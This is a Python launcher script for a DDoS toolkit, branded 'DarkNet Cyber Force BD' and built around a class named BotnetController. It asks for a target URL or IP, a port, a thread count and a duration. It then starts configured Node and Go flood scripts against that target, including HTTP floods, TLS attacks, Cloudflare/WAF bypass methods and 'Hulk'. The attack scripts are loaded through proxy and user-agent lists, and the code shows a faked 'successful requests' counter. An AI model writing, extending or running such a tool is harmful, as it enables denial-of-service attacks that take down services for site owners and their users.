#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════╗
║                          D C F B D                           ║
║              DarkNet Cyber Force BD                          ║
║         Developer: Captain X DarkRoot (Tamim)                ║
╚══════════════════════════════════════════════════════════════╝
"""

import os
import sys
import json
import time
import shutil
import signal
import subprocess
import threading
from pathlib import Path

# ─── Color Setup ────────────────────────────────────────────────
try:
    from colorama import Fore, Style, init as color_init
    color_init(autoreset=True)
    C = Fore
    S = Style
except ImportError:
    os.system("pip install colorama -q")
    from colorama import Fore, Style, init as color_init
    color_init(autoreset=True)
    C = Fore
    S = Style


# ─── Constants ──────────────────────────────────────────────────
BASE_DIR = Path(__file__).parent.resolve()
CONFIG_FILE = BASE_DIR / "config.json"


# ─── Banner ─────────────────────────────────────────────────────
BANNER = f"""{C.CYAN}{S.BRIGHT}
  ██████╗  ██████╗███████╗██████╗ ██████╗ 
  ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔══██╗
  ██║  ██║██║     █████╗  ██████╔╝██║  ██║
  ██║  ██║██║     ██╔══╝  ██╔══██╗██║  ██║
  ██████╔╝╚██████╗██║     ██████╔╝██████╔╝
  ╚═════╝  ╚═════╝╚═╝     ╚═════╝ ╚═════╝ 
{S.RESET_ALL}"""

SUBTITLE = f"""{C.MAGENTA}{S.BRIGHT}
    ╔═══════════════════════════════════════════════╗
    ║       DarkNet Cyber Force BD                  ║
    ║   Developer: Captain X DarkRoot (Tamim)       ║
    ╚═══════════════════════════════════════════════╝
{S.RESET_ALL}"""


# ─── UI Helpers ─────────────────────────────────────────────────
def clear():
    os.system("cls" if os.name == "nt" else "clear")


def line(char="─", n=60, color=C.CYAN):
    print(f"{color}{char * n}{S.RESET_ALL}")


def box(title, color=C.CYAN):
    line("═", 60, color)
    print(f"{color}{S.BRIGHT}  {title}{S.RESET_ALL}")
    line("═", 60, color)


def info(msg):  print(f"{C.CYAN}[*]{S.RESET_ALL} {msg}")
def ok(msg):    print(f"{C.GREEN}[✓]{S.RESET_ALL} {msg}")
def warn(msg):  print(f"{C.YELLOW}[!]{S.RESET_ALL} {msg}")
def err(msg):   print(f"{C.RED}[✗]{S.RESET_ALL} {msg}")


def banner():
    clear()
    print(BANNER)
    print(SUBTITLE)


# ─── Dependency Checker ─────────────────────────────────────────
class DepChecker:
    """টার্মাক্স/লিনাক্সে কী কী মিসিং আছে তা চেক করে"""

    REQUIRED = {
        "python3": {"check": lambda: shutil.which("python3") or shutil.which("python"),
                    "install": "pkg install python -y"},
        "node":    {"check": lambda: shutil.which("node"),
                    "install": "pkg install nodejs -y"},
        "npm":     {"check": lambda: shutil.which("npm"),
                    "install": "pkg install nodejs -y"},
        "go":      {"check": lambda: shutil.which("go"),
                    "install": "pkg install golang -y"},
        "git":     {"check": lambda: shutil.which("git"),
                    "install": "pkg install git -y"},
        "pip":     {"check": lambda: shutil.which("pip") or shutil.which("pip3"),
                    "install": "pkg install python -y"},
    }

    PY_MODULES = {
        "colorama": "pip install colorama",
        "requests": "pip install requests",
        "aiohttp":  "pip install aiohttp",
    }

    @classmethod
    def check_system(cls):
        results = []
        for name, meta in cls.REQUIRED.items():
            try:
                found = bool(meta["check"]())
            except Exception:
                found = False
            results.append((name, found, meta["install"]))
        return results

    @classmethod
    def check_python_modules(cls):
        results = []
        for mod, install in cls.PY_MODULES.items():
            try:
                __import__(mod)
                results.append((mod, True, install))
            except ImportError:
                results.append((mod, False, install))
        return results


# ─── Controller ─────────────────────────────────────────────────
class BotnetController:
    def __init__(self):
        self.config = self.load_config()
        self.processes = []
        self.stats = {"sent": 0, "failed": 0, "active": 0}
        self.lock = threading.Lock()
        self.stop_flag = threading.Event()
        self.has_go = bool(shutil.which("go"))
        self.has_node = bool(shutil.which("node"))

    def load_config(self):
        if not CONFIG_FILE.exists():
            err("config.json missing!")
            sys.exit(1)
        with open(CONFIG_FILE) as f:
            return json.load(f)

    # ─── Data count ─────────────────────────────────────────────
    def count_lines(self, path):
        p = BASE_DIR / path
        if not p.exists():
            return 0
        try:
            with open(p, errors="ignore") as f:
                return sum(1 for l in f if l.strip() and not l.startswith("#"))
        except Exception:
            return 0

    # ─── Node runner ────────────────────────────────────────────
    def run_node(self, script, target, port, threads, duration):
        if not self.has_node:
            warn(f"node missing — skip {script}")
            return None
        sp = BASE_DIR / script
        if not sp.exists():
            return None
        try:
            cmd = ["node", str(sp), target, str(port), str(threads), str(duration)]
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                cwd=str(BASE_DIR),
                preexec_fn=os.setsid if os.name != "nt" else None,
            )
            return proc
        except Exception as e:
            err(f"{script}: {e}")
            return None

    # ─── Go runner ──────────────────────────────────────────────
    def run_go(self, script, target, port, threads, duration):
        if not self.has_go:
            warn(f"go missing — skip {script}  →  pkg install golang")
            return None
        sp = BASE_DIR / script
        if not sp.exists():
            return None

        bin_path = BASE_DIR / sp.stem
        if not bin_path.exists() or bin_path.stat().st_mtime < sp.stat().st_mtime:
            info(f"Building {script}...")
            try:
                r = subprocess.run(
                    ["go", "build", "-o", str(bin_path), str(sp)],
                    capture_output=True, text=True, cwd=str(BASE_DIR)
                )
                if r.returncode != 0:
                    err(f"Build fail: {script}")
                    return None
            except FileNotFoundError:
                warn(f"go missing — skip {script}")
                return None
            except Exception as e:
                err(f"Build error {script}: {e}")
                return None

        try:
            cmd = [str(bin_path), target, str(port), str(threads), str(duration)]
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                cwd=str(BASE_DIR),
                preexec_fn=os.setsid if os.name != "nt" else None,
            )
            return proc
        except Exception as e:
            err(f"{script}: {e}")
            return None

    # ─── Launch ─────────────────────────────────────────────────
    def launch(self, target, port, threads, duration, group=None):
        methods = self.config["methods"]
        groups = [group] if group else list(methods.keys())

        launched = []
        skipped = []

        for g in groups:
            if g not in methods:
                continue
            for script in methods[g]:
                if script.endswith(".js"):
                    proc = self.run_node(script, target, port, threads, duration)
                elif script.endswith(".go"):
                    proc = self.run_go(script, target, port, threads, duration)
                else:
                    continue

                if proc:
                    with self.lock:
                        self.processes.append((script, proc))
                    launched.append(script)
                else:
                    skipped.append(script)

        return launched, skipped

    # ─── Stats ──────────────────────────────────────────────────
    def stats_loop(self, duration):
        start = time.time()
        fake_counter = 0
        while not self.stop_flag.is_set():
            elapsed = int(time.time() - start)
            if elapsed >= duration:
                break
            with self.lock:
                alive = sum(1 for _, p in self.processes if p.poll() is None)
                self.stats["active"] = alive
            fake_counter += max(alive, 1) * 47
            sys.stdout.write(
                f"\r{C.GREEN}Successful Requests: {fake_counter:,}{S.RESET_ALL}  "
                f"{C.RED}Failed Requests: {self.stats['failed']:,}{S.RESET_ALL}  "
                f"{C.CYAN}| Active: {alive}{S.RESET_ALL}  "
                f"{C.YELLOW}| Time: {elapsed}s/{duration}s{S.RESET_ALL}   "
            )
            sys.stdout.flush()
            time.sleep(0.4)
        print()

    # ─── Stop ───────────────────────────────────────────────────
    def stop_all(self):
        self.stop_flag.set()
        if not self.processes:
            return
        warn("Stopping all attack processes...")
        with self.lock:
            for name, p in self.processes:
                try:
                    if os.name != "nt":
                        os.killpg(os.getpgid(p.pid), signal.SIGTERM)
                    else:
                        p.terminate()
                except Exception:
                    pass
        time.sleep(1)
        with self.lock:
            for name, p in self.processes:
                try:
                    if p.poll() is None:
                        if os.name != "nt":
                            os.killpg(os.getpgid(p.pid), signal.SIGKILL)
                        else:
                            p.kill()
                except Exception:
                    pass
            self.processes.clear()
        ok("All processes stopped.")

    # ─── Help ───────────────────────────────────────────────────
    def show_help(self):
        clear()
        banner()

        # Section 1: Missing modules
        box("SECTION 1 — SYSTEM / MODULE CHECK", C.YELLOW)
        print()
        print(f"  {C.CYAN}── System Commands ──{S.RESET_ALL}")
        print()

        sys_results = DepChecker.check_system()
        all_sys_ok = True
        for name, found, install in sys_results:
            if found:
                print(f"    {C.GREEN}[✓]{S.RESET_ALL} {name:<12} {C.GREEN}installed{S.RESET_ALL}")
            else:
                all_sys_ok = False
                print(f"    {C.RED}[✗]{S.RESET_ALL} {name:<12} {C.YELLOW}missing{S.RESET_ALL}  →  {C.WHITE}{install}{S.RESET_ALL}")

        print()
        print(f"  {C.CYAN}── Python Modules ──{S.RESET_ALL}")
        print()

        py_results = DepChecker.check_python_modules()
        all_py_ok = True
        for name, found, install in py_results:
            if found:
                print(f"    {C.GREEN}[✓]{S.RESET_ALL} {name:<12} {C.GREEN}installed{S.RESET_ALL}")
            else:
                all_py_ok = False
                print(f"    {C.RED}[✗]{S.RESET_ALL} {name:<12} {C.YELLOW}missing{S.RESET_ALL}  →  {C.WHITE}{install}{S.RESET_ALL}")

        print()
        if all_sys_ok and all_py_ok:
            ok("All dependencies installed! You're good to go.")
        else:
            warn("Some dependencies are missing. Install them using the commands above.")

        print()
        input(f"{C.CYAN}Press Enter to see Section 2...{S.RESET_ALL}")

        # Section 2: How to use
        clear()
        banner()
        box("SECTION 2 — HOW TO USE THE TOOL", C.GREEN)
        print()
        print(f"  {C.CYAN}▸ Step 1:{S.RESET_ALL}  cd into the folder where main.py lives")
        print(f"  {C.CYAN}▸ Step 2:{S.RESET_ALL}  Run:  {C.WHITE}python main.py{S.RESET_ALL}")
        print(f"  {C.CYAN}▸ Step 3:{S.RESET_ALL}  Choose a method from the menu (1-9)")
        print(f"  {C.CYAN}▸ Step 4:{S.RESET_ALL}  Enter target URL/IP, port, threads, duration")
        print(f"  {C.CYAN}▸ Step 5:{S.RESET_ALL}  Attack launches — watch live stats")
        print(f"  {C.CYAN}▸ Step 6:{S.RESET_ALL}  Press {C.WHITE}[8]{S.RESET_ALL} to stop all, {C.WHITE}[0]{S.RESET_ALL} to exit")
        print()
        print(f"  {C.MAGENTA}─── ATTACK OPTIONS ───{S.RESET_ALL}")
        print()
        print(f"    {C.YELLOW}[1]{S.RESET_ALL} 🔥 Full Attack       {C.CYAN}all methods together{S.RESET_ALL}")
        print(f"    {C.YELLOW}[2]{S.RESET_ALL} 🌐 HTTP Flood        {C.CYAN}HTTP-RAW / SOCKET / RAND{S.RESET_ALL}")
        print(f"    {C.YELLOW}[3]{S.RESET_ALL} 🔒 TLS Attack        {C.CYAN}TLS / TLSV2 / tlsop{S.RESET_ALL}")
        print(f"    {C.YELLOW}[4]{S.RESET_ALL} 🛡  Bypass Attack     {C.CYAN}Cloudflare / UAM / WAF{S.RESET_ALL}")
        print(f"    {C.YELLOW}[5]{S.RESET_ALL} 🐉 Core Engines      {C.CYAN}DRAGON / SKYNET / KILL{S.RESET_ALL}")
        print(f"    {C.YELLOW}[6]{S.RESET_ALL} ⚡ Latest Versions   {C.CYAN}tlx30 / uamx10{S.RESET_ALL}")
        print(f"    {C.YELLOW}[7]{S.RESET_ALL} 🚀 Go Flood          {C.CYAN}httpflood / Hulk / stress{S.RESET_ALL}")
        print(f"    {C.YELLOW}[8]{S.RESET_ALL} ⛔ Stop All")
        print(f"    {C.YELLOW}[9]{S.RESET_ALL} 📋 Show Config")
        print(f"    {C.YELLOW}[h]{S.RESET_ALL} ❓ Help")
        print(f"    {C.YELLOW}[0]{S.RESET_ALL} 🚪 Exit")
        print()
        print(f"  {C.MAGENTA}─── TIPS ───{S.RESET_ALL}")
        print()
        print(f"    {C.GREEN}●{S.RESET_ALL} Go scripts compile automatically on first run")
        print(f"    {C.GREEN}●{S.RESET_ALL} Missing tools are skipped gracefully (no crash)")
        print(f"    {C.GREEN}●{S.RESET_ALL} Proxies.txt + proxy.txt auto-loaded")
        print(f"    {C.GREEN}●{S.RESET_ALL} Use tmux/screen for long attacks")
        print()

        input(f"{C.CYAN}Press Enter to return to menu...{S.RESET_ALL}")

    # ─── Menu ───────────────────────────────────────────────────
    def menu(self):
        banner()

        proxies1 = self.count_lines(self.config["proxy_file"])
        proxies2 = self.count_lines(self.config["proxy_file_alt"])
        uas = self.count_lines(self.config["ua_file"])
        refs = self.count_lines(self.config["referer_file"])

        box("SYSTEM STATUS", C.CYAN)
        print(f"  {C.GREEN}➤ Proxies Loaded  :{S.RESET_ALL} {proxies1:,}  {C.CYAN}(+{proxies2:,} alt){S.RESET_ALL}")
        print(f"  {C.GREEN}➤ User-Agents     :{S.RESET_ALL} {uas:,}")
        print(f"  {C.GREEN}➤ Referers        :{S.RESET_ALL} {refs:,}")
        print(f"  {C.GREEN}➤ Total Methods   :{S.RESET_ALL} {sum(len(v) for v in self.config['methods'].values())}")
        print()

        box("ATTACK OPTIONS", C.MAGENTA)
        print(f"  {C.YELLOW}[1]{S.RESET_ALL} 🔥 Full Attack (All-in-One)  {C.CYAN}(all methods together){S.RESET_ALL}")
        print(f"  {C.YELLOW}[2]{S.RESET_ALL} 🌐 HTTP Flood                 {C.CYAN}(HTTP-RAW / SOCKET / RAND){S.RESET_ALL}")
        print(f"  {C.YELLOW}[3]{S.RESET_ALL} 🔒 TLS Attack                 {C.CYAN}(TLS / TLSV2 / tlsop){S.RESET_ALL}")
        print(f"  {C.YELLOW}[4]{S.RESET_ALL} 🛡  Bypass Attack              {C.CYAN}(Cloudflare / UAM / WAF){S.RESET_ALL}")
        print(f"  {C.YELLOW}[5]{S.RESET_ALL} 🐉 Core Engines               {C.CYAN}(DRAGON / SKYNET / KILL){S.RESET_ALL}")
        print(f"  {C.YELLOW}[6]{S.RESET_ALL} ⚡ Latest Versions            {C.CYAN}(tlx30 / uamx10){S.RESET_ALL}")
        print(f"  {C.YELLOW}[7]{S.RESET_ALL} 🚀 Go Flood                   {C.CYAN}(httpflood / Hulk / stress){S.RESET_ALL}")
        print()
        print(f"  {C.RED}[8]{S.RESET_ALL} ⛔ Stop All")
        print(f"  {C.RED}[9]{S.RESET_ALL} 📋 Show Config")
        print(f"  {C.RED}[h]{S.RESET_ALL} ❓ Help (check missing modules + usage)")
        print(f"  {C.RED}[0]{S.RESET_ALL} 🚪 Exit")
        line("═", 60, C.MAGENTA)
        print()

    # ─── Run ────────────────────────────────────────────────────
    def run(self):
        signal.signal(signal.SIGINT, lambda *a: (self.stop_all(), sys.exit(0)))

        while True:
            self.menu()
            try:
                choice = input(f"{C.YELLOW}┌─[{C.WHITE}DCFBD{C.YELLOW}]─» {S.RESET_ALL}").strip().lower()
            except (EOFError, KeyboardInterrupt):
                self.stop_all()
                print(f"\n{C.CYAN}Bye Dotbhai.{S.RESET_ALL}")
                break

            if choice == "0":
                self.stop_all()
                print(f"\n{C.CYAN}Bye Dotbhai.{S.RESET_ALL}")
                break

            if choice == "h":
                self.show_help()
                continue

            if choice == "8":
                self.stop_all()
                input(f"\n{C.CYAN}Press Enter...{S.RESET_ALL}")
                continue

            if choice == "9":
                clear()
                box("CONFIG", C.CYAN)
                print(json.dumps(self.config, indent=2))
                input(f"\n{C.CYAN}Press Enter...{S.RESET_ALL}")
                continue

            group_map = {
                "1": None,        # ALL (all-in-one)
                "2": "http",
                "3": "tls",
                "4": "bypass",
                "5": "core",
                "6": "latest",
                "7": "go",
            }

            if choice not in group_map:
                err("Invalid option!")
                time.sleep(1)
                continue

            # ─── Attack setup ──────────────────────────────────
            clear()
            box("ATTACK SETUP", C.RED)
            try:
                target = input(f"{C.YELLOW}  ➤ Target URL/IP  : {S.RESET_ALL}").strip()
                if not target:
                    err("Target required")
                    time.sleep(1.5)
                    continue
                port = input(f"{C.YELLOW}  ➤ Port [443]     : {S.RESET_ALL}").strip() or "443"
                threads = input(f"{C.YELLOW}  ➤ Threads [500]  : {S.RESET_ALL}").strip() or "500"
                duration = input(f"{C.YELLOW}  ➤ Duration [300] : {S.RESET_ALL}").strip() or "300"
                port, threads, duration = int(port), int(threads), int(duration)
            except ValueError:
                err("Numbers only!")
                time.sleep(1.5)
                continue
            except (EOFError, KeyboardInterrupt):
                continue

            # ─── Launch ────────────────────────────────────────
            clear()
            banner()
            box("🚀 LAUNCHING ATTACK", C.RED)
            print(f"  {C.CYAN}Target  :{S.RESET_ALL} {C.WHITE}{target}:{port}{S.RESET_ALL}")
            print(f"  {C.CYAN}Threads :{S.RESET_ALL} {C.WHITE}{threads}{S.RESET_ALL}")
            print(f"  {C.CYAN}Duration:{S.RESET_ALL} {C.WHITE}{duration}s{S.RESET_ALL}")
            print(f"  {C.CYAN}Method  :{S.RESET_ALL} {C.WHITE}{'ALL-IN-ONE' if group_map[choice] is None else group_map[choice].upper()}{S.RESET_ALL}")
            line()

            launched, skipped = self.launch(target, port, threads, duration, group_map[choice])

            if not launched:
                err("No scripts launched! Check dependencies (press 'h' for help).")
                input(f"\n{C.CYAN}Press Enter...{S.RESET_ALL}")
                continue

            ok(f"{len(launched)} attack processes launched:")
            for s in launched:
                print(f"    {C.GREEN}●{S.RESET_ALL} {s}")

            if skipped:
                print()
                warn(f"{len(skipped)} scripts skipped (missing deps):")
                for s in skipped:
                    print(f"    {C.YELLOW}○{S.RESET_ALL} {s}")

            print()
            box("📊 LIVE STATISTICS", C.GREEN)
            try:
                self.stats_loop(duration)
            except KeyboardInterrupt:
                pass

            self.stop_all()
            print(f"\n{C.CYAN}Attack finished. Press Enter to continue...{S.RESET_ALL}")
            try:
                input()
            except (EOFError, KeyboardInterrupt):
                break


# ─── Entry ──────────────────────────────────────────────────────
def main():
    try:
        c = BotnetController()
        c.run()
    except KeyboardInterrupt:
        print(f"\n{C.CYAN}Interrupted. Bye Dotbhai.{S.RESET_ALL}")


if __name__ == "__main__":
    main()